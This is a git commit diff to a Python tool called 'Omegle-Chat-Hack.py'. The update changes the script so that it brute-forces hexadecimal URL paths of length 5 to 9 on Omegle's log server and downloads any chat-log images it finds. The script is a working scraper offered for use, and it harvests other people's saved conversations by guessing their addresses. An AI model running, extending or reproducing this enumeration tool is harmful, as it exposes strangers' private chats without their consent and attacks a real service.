da73f003ab712327dd5beefd7b84dfca0f8f5d13
Samuel Walters-Nevet <SamuelWN@users.noreply.github.com>
2016-08-19 16:06:10 -0400

    Update Omegle-Chat-Hack.py
    Increased autonomy of the process
    Expanded search range of the URL encoding

--- Omegle-Chat-Hack.py
+++ Omegle-Chat-Hack.py
@@ -2,33 +2,38 @@
 # Made by - Indrajeet Bhuyan (www.hackatrick.com)
 #
 #
-# Version: 0.1 
+# Version: 0.1
 # Date:    07-08-2016 (dd-mm-yyyy)
+#
+# Version 0.2
+# Date:     19-08-2016
 #
 # This tool downloads random chat logs which are saved in omegle's server.
 
+# f=str(0)
 
 
+import itertools
 import urllib.request
-import random
-ran=random.randint(100,500)
-url="http://l.omegle.com/7"
+
 print("\t\t----------Omegle Chat Hack----------\n")
-numberofImagesWanted=int(input("enter limit 100-500 : " ))
-end="2f6.png"
-for i in range (ran,ran+numberofImagesWanted):
-    
-    finalurl=url+str(i)+end
+
+url="http://l.omegle.com/"
+
+stuff = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" ]
+for L in range(5, 10):
+  for i in itertools.combinations_with_replacement(stuff, L):
+
+    finalurl=url+str(''.join(i))+".png"
 
     omRequest = urllib.request.Request(finalurl)
-    try : 
+    try :
             req = urllib.request.urlopen(omRequest)
             print('Chat downloaded \n***********************\n')
-            filename = str(i)+".png"
+            filename = str(''.join(i))+".png"
             output = open(filename,"wb")
             output.write(req.read())
             output.close()
     except  urllib.error.URLError as e:
             print("Unsuccessful")
             continue
-
